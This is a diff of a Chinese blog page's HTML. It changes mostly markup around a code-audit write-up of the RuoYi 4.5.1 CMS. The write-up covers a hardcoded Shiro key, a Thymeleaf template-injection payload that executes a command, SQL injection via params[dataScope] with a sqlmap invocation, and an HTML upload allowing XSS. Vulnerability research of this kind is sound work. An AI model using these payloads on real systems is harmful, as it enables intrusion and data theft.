@@ -59,20 +59,20 @@
         <div class="post-tags"><a href="/tags/?tag=%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">#代码审计</a><a href="/tags/?tag=ruoyi">#ruoyi</a><a href="/tags/?tag=CMS">#CMS</a></div>
       </header>
       <div class="post-layout section-shell">
-        <article class="article-content" data-article-content><h1 id="前期准备">前期准备<a class="heading-anchor" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87" aria-label="链接到 前期准备">#</a></h1><p>源码</p>
+        <article class="article-content" data-article-content><h2 id="前期准备">前期准备<a class="heading-anchor" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87" aria-label="链接到 前期准备">#</a></h2><p>源码</p>
 <p><a href="https://github.com/yangzongzhuan/RuoYi/releases?page=2" target="_blank" rel="noopener noreferrer">Releases · yangzongzhuan/RuoYi<svg class="icon external-link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></p>
 <p>导入sql文件</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135444858.png" alt="image-20250606135444858" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1490 / 667;--image-max-width:1698px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135444858.png" alt="image-20250606135444858" loading="lazy" decoding="async" width="1490" height="667"></span></figure></p>
 <p>修改配置文件<code>src/main/resources/application-druid.yml</code></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135824282.png" alt="image-20250606135824282" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135646077.png" alt="" loading="lazy" decoding="async"></figure></p>
-<h1 id="shiro反序列化">Shiro反序列化<a class="heading-anchor" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" aria-label="链接到 Shiro反序列化">#</a></h1><p>pom.xml中发现引入了Shiro组件</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135917196.png" alt="image-20250606135917196" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1560;--image-max-width:1247px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135824282.png" alt="image-20250606135824282" loading="lazy" decoding="async" width="2560" height="1560"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1452;--image-max-width:1336px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135646077.png" alt="" loading="lazy" decoding="async" width="2552" height="1452"></span></figure></p>
+<h2 id="shiro反序列化">Shiro反序列化<a class="heading-anchor" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" aria-label="链接到 Shiro反序列化">#</a></h2><p>pom.xml中发现引入了Shiro组件</p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1046 / 678;--image-max-width:1173px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135917196.png" alt="image-20250606135917196" loading="lazy" decoding="async" width="1046" height="678"></span></figure></p>
 <p>全局搜索cipherKey在<code>src/main/resources/application.yml</code>找到硬编码了密钥信息</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">zSyK5Kp6PZAAjlT+eeNMlg==</code></pre></figure><p>发现login逻辑中有一个Boolean参数rememberMe</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606140639142.png" alt="image-20250606140639142" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1968 / 518;--image-max-width:2887px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606140639142.png" alt="image-20250606140639142" loading="lazy" decoding="async" width="1968" height="518"></span></figure></p>
 <p>抓包验证</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606144009115.png" alt="image-20250606144009115" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:927 / 299;--image-max-width:2356px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606144009115.png" alt="image-20250606144009115" loading="lazy" decoding="async" width="927" height="299"></span></figure></p>
 <p>查看subject.login跳转到<code>jetbrains://idea/navigate/reference?project=RuoYi-4.5.1&amp;path=~\.m2\repository\org\apache\shiro\shiro-core\1.7.0\shiro-core-1.7.0.jar!\org\apache\shiro\subject\Subject.class</code></p>
 <p>说明已经来到了Shiro对应的Jar包中，用的Shiro进行的鉴权</p>
 <p>在知道Shiro加密密钥和确认Web使用了Shiro进行登录认证鉴权的前提下可以通过漏洞利用工具直接进行利用</p>
@@ -80,16 +80,16 @@
 <p>Apache Shiro &lt;=1.2.4版本属于密钥硬编码且使用AES-CBC加密模式，在Apache Shiro 1.2.4版本之后则是由用户指定密钥且加密模式更改为了AES-GCM</p>
 </blockquote>
 <p>查看版本</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606141602830.png" alt="image-20250606141602830" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:652 / 183;--image-max-width:2708px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606141602830.png" alt="image-20250606141602830" loading="lazy" decoding="async" width="652" height="183"></span></figure></p>
 <p>工具直接打即可</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143040099.png" alt="image-20250606143040099" loading="lazy" decoding="async"></figure></p>
-<h1 id="thymeleaf模版注入">Thymeleaf模版注入<a class="heading-anchor" href="#thymeleaf%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5" aria-label="链接到 Thymeleaf模版注入">#</a></h1><p>发现thymeleaf组件 版本为2.0.0</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143128503.png" alt="image-20250606143128503" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1000 / 796;--image-max-width:955px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143040099.png" alt="image-20250606143040099" loading="lazy" decoding="async" width="1000" height="796"></span></figure></p>
+<h2 id="thymeleaf模版注入">Thymeleaf模版注入<a class="heading-anchor" href="#thymeleaf%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5" aria-label="链接到 Thymeleaf模版注入">#</a></h2><p>发现thymeleaf组件 版本为2.0.0</p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:911 / 205;--image-max-width:3377px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143128503.png" alt="image-20250606143128503" loading="lazy" decoding="async" width="911" height="205"></span></figure></p>
 <p>先全局搜一下<code>::</code>查看哪些组件可控</p>
 <blockquote>
 <p>src/main/java/com/ruoyi/web/controller/demo/controller/DemoFormController.java</p>
 </blockquote>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143557031.png" alt="image-20250606143557031" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1727 / 798;--image-max-width:1645px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143557031.png" alt="image-20250606143557031" loading="lazy" decoding="async" width="1727" height="798"></span></figure></p>
 <p>接受两个参数</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">* @param    fragment   页面中的模板名称
 * @param    taskName   任务名称</code></pre></figure><p>构造payload</p>
@@ -107,26 +107,26 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 Cookie: JSESSIONID=5b02998a-cf66-4ed5-a4bb-bbf66bfb8f28
 Content-Type: application/x-www-form-urlencoded
 
-taskName=1&amp;fragment=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()}__::.x</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606144504522.png" alt="image-20250606144504522" loading="lazy" decoding="async"></figure></p>
-<h1 id="sqlinjection安全问题">SQLInjection安全问题<a class="heading-anchor" href="#sqlinjection%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98" aria-label="链接到 SQLInjection安全问题">#</a></h1><blockquote>
+taskName=1&amp;fragment=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()}__::.x</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1877 / 1042;--image-max-width:1369px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606144504522.png" alt="image-20250606144504522" loading="lazy" decoding="async" width="1877" height="1042"></span></figure></p>
+<h2 id="sqlinjection安全问题">SQLInjection安全问题<a class="heading-anchor" href="#sqlinjection%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98" aria-label="链接到 SQLInjection安全问题">#</a></h2><blockquote>
 <p>RuoYI CMS使用了Mybatis持久层框架，而在MyBatis中会使用XML或注解来配置和映射原生信息将接口和Java的POJOs(Plain Ordinary Java Object，普通的Java对象)映射成数据库中的记录，所以我们可以通过全局检索&quot;${}&quot;来确定未使用预编译的可疑位置，随后进行参数回溯分析来确定漏洞是否真实存在</p>
 </blockquote>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606150726784.png" alt="image-20250606150726784" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2412 / 731;--image-max-width:2508px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606150726784.png" alt="image-20250606150726784" loading="lazy" decoding="async" width="2412" height="731"></span></figure></p>
 <p>根据对应的mapper接口<code>&lt;mapper namespace=&quot;com.ruoyi.system.mapper.SysDeptMapper&quot;&gt;</code></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151212635.png" alt="image-20250606151212635" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1560;--image-max-width:1247px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151212635.png" alt="image-20250606151212635" loading="lazy" decoding="async" width="2560" height="1560"></span></figure></p>
 <p>检索接口的具体调用点有那些位置</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151310161.png" alt="image-20250606151310161" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1156 / 458;--image-max-width:1918px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151310161.png" alt="image-20250606151310161" loading="lazy" decoding="async" width="1156" height="458"></span></figure></p>
 <p>向上回溯Controller层</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151449507.png" alt="image-20250606151449507" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1143 / 385;--image-max-width:2256px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151449507.png" alt="image-20250606151449507" loading="lazy" decoding="async" width="1143" height="385"></span></figure></p>
 <blockquote>
 <p>@RequiresPermissions注解表明接口访问权限</p>
 <p>@ResponseBody注解表明会将返回值写入http响应</p>
 </blockquote>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151521836.png" alt="image-20250606151521836" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1050 / 293;--image-max-width:2724px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151521836.png" alt="image-20250606151521836" loading="lazy" decoding="async" width="1050" height="293"></span></figure></p>
 <p>还需要看一下上层在调用接口的时候是否有做过滤处理</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151746230.png" alt="image-20250606151746230" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1560;--image-max-width:1247px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151746230.png" alt="image-20250606151746230" loading="lazy" decoding="async" width="2560" height="1560"></span></figure></p>
 <p>发现没有 那么就可以确定/system/dept/list存在sql注入</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151929184.png" alt="image-20250606151929184" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2549 / 593;--image-max-width:3267px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151929184.png" alt="image-20250606151929184" loading="lazy" decoding="async" width="2549" height="593"></span></figure></p>
 <p>正常请求没有参数，可以手动构造<code>params[dataScope]</code>丢给sqlmap跑一下</p>
 <blockquote>
 <p>在 Java 后端中，这样的参数会自动映射为一个嵌套的 Map：</p>
@@ -135,28 +135,28 @@ taskName=1&amp;fragment=__${new java.util.Scanner(T(java.lang.Runtime).getRuntim
 </blockquote>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">deptName=
 status=0
-params[dataScope]=</code></pre></figure><figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd">python sqlmap.py -r C:\Users\<span class="hljs-number">31702</span>\Desktop\req.txt --batch</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606152747975.png" alt="image-20250606152747975" loading="lazy" decoding="async"></figure></p>
+params[dataScope]=</code></pre></figure><figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd">python sqlmap.py -r C:\Users\<span class="hljs-number">31702</span>\Desktop\req.txt --batch</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:979 / 512;--image-max-width:1453px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606152747975.png" alt="image-20250606152747975" loading="lazy" decoding="async" width="979" height="512"></span></figure></p>
 <p>其余的漏洞点同理，这里再给一处</p>
 <p>从SysUserMapper出发</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153348584.png" alt="image-20250606153348584" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153342319.png" alt="image-20250606153342319" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1510 / 941;--image-max-width:1220px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153348584.png" alt="image-20250606153348584" loading="lazy" decoding="async" width="1510" height="941"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:934 / 513;--image-max-width:1384px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153342319.png" alt="image-20250606153342319" loading="lazy" decoding="async" width="934" height="513"></span></figure></p>
 <p>回溯Controller层</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153453298.png" alt="image-20250606153453298" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1560;--image-max-width:1247px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153453298.png" alt="image-20250606153453298" loading="lazy" decoding="async" width="2560" height="1560"></span></figure></p>
 <p>抓个包</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153727664.png" alt="image-20250606153727664" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1576 / 695;--image-max-width:1723px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153727664.png" alt="image-20250606153727664" loading="lazy" decoding="async" width="1576" height="695"></span></figure></p>
 <p>手动添加params[dataScope]</p>
-<figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd">pageSize=<span class="hljs-number">10</span>&amp;pageNum=<span class="hljs-number">1</span>&amp;orderByColumn=createTime&amp;isAsc=desc&amp;deptId=<span class="hljs-number">100</span>&amp;parentId=&amp;loginName=&amp;phonenumber=&amp;status=&amp;params<span class="hljs-variable">%5BbeginTime%</span><span class="hljs-number">5</span>D=&amp;params<span class="hljs-variable">%5BendTime%</span><span class="hljs-number">5</span>D=&amp;params[dataScope]=</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154125820.png" alt="image-20250606154125820" loading="lazy" decoding="async"></figure></p>
-<h1 id="文件上传导致xss">文件上传导致XSS<a class="heading-anchor" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4xss" aria-label="链接到 文件上传导致XSS">#</a></h1><p>文件上传位置</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154240737.png" alt="image-20250606154240737" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd">pageSize=<span class="hljs-number">10</span>&amp;pageNum=<span class="hljs-number">1</span>&amp;orderByColumn=createTime&amp;isAsc=desc&amp;deptId=<span class="hljs-number">100</span>&amp;parentId=&amp;loginName=&amp;phonenumber=&amp;status=&amp;params<span class="hljs-variable">%5BbeginTime%</span><span class="hljs-number">5</span>D=&amp;params<span class="hljs-variable">%5BendTime%</span><span class="hljs-number">5</span>D=&amp;params[dataScope]=</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1560;--image-max-width:1247px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154125820.png" alt="image-20250606154125820" loading="lazy" decoding="async" width="2560" height="1560"></span></figure></p>
+<h2 id="文件上传导致xss">文件上传导致XSS<a class="heading-anchor" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4xss" aria-label="链接到 文件上传导致XSS">#</a></h2><p>文件上传位置</p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 727;--image-max-width:2668px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154240737.png" alt="image-20250606154240737" loading="lazy" decoding="async" width="2552" height="727"></span></figure></p>
 <p>全局搜FileUpload定位到上传位置</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154332609.png" alt="image-20250606154332609" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:908 / 536;--image-max-width:1287px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154332609.png" alt="image-20250606154332609" loading="lazy" decoding="async" width="908" height="536"></span></figure></p>
 <p>跟进</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154406790.png" alt="image-20250606154406790" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1131 / 827;--image-max-width:1039px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154406790.png" alt="image-20250606154406790" loading="lazy" decoding="async" width="1131" height="827"></span></figure></p>
 <p>紧接着在这里调用重载的upload方法来进行文件上传操作</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154524613.png" alt="image-20250606154524613" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1237 / 811;--image-max-width:1159px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154524613.png" alt="image-20250606154524613" loading="lazy" decoding="async" width="1237" height="811"></span></figure></p>
 <p>然后就是文件后缀和长度的检测</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154758566.png" alt="image-20250606154758566" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154554612.png" alt="image-20250606154554612" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:849 / 294;--image-max-width:2195px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154758566.png" alt="image-20250606154758566" loading="lazy" decoding="async" width="849" height="294"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:737 / 156;--image-max-width:3591px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154554612.png" alt="image-20250606154554612" loading="lazy" decoding="async" width="737" height="156"></span></figure></p>
 <figure class="code-block"><figcaption><span>java</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">assertAllowed</span><span class="hljs-params">(MultipartFile file, String[] allowedExtension)</span>
         <span class="hljs-keyword">throws</span> FileSizeLimitExceededException, InvalidExtensionException
 {
@@ -197,10 +197,10 @@ params[dataScope]=</code></pre></figure><figure class="code-block"><figcaption><
     }
 
 }</code></pre></figure><p>包含了html文件和pdf文件可以用于进行上传对应类型的文件，如果支持在线解析则可以导致XSS</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606155507590.png" alt="image-20250606155507590" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606155519885.png" alt="image-20250606155519885" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2451 / 629;--image-max-width:2961px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606155507590.png" alt="image-20250606155507590" loading="lazy" decoding="async" width="2451" height="629"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 193;--image-max-width:10081px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606155519885.png" alt="image-20250606155519885" loading="lazy" decoding="async" width="2560" height="193"></span></figure></p>
 </article>
-        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><p>本文没有分节</p></div></nav></aside>
+        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><a class="toc-depth-2" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87">前期准备</a><a class="toc-depth-2" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Shiro反序列化</a><a class="toc-depth-2" href="#thymeleaf%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5">Thymeleaf模版注入</a><a class="toc-depth-2" href="#sqlinjection%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98">SQLInjection安全问题</a><a class="toc-depth-2" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4xss">文件上传导致XSS</a></div></nav></aside>
       </div>
       <div class="post-tools section-shell">
         <button type="button" data-copy-link><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg><span>复制链接</span></button>
@@ -214,7 +214,7 @@ params[dataScope]=</code></pre></figure><figure class="code-block"><figcaption><
     <a href="/posts/32bcf973.html"><span>2025/07/02</span><strong>CVE-2025-32463复现</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
     <a href="/posts/d64ee7.html"><span>2025/02/19</span><strong>Java反序列化之URLDNS链分析</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></div></section>
     </main>
-    
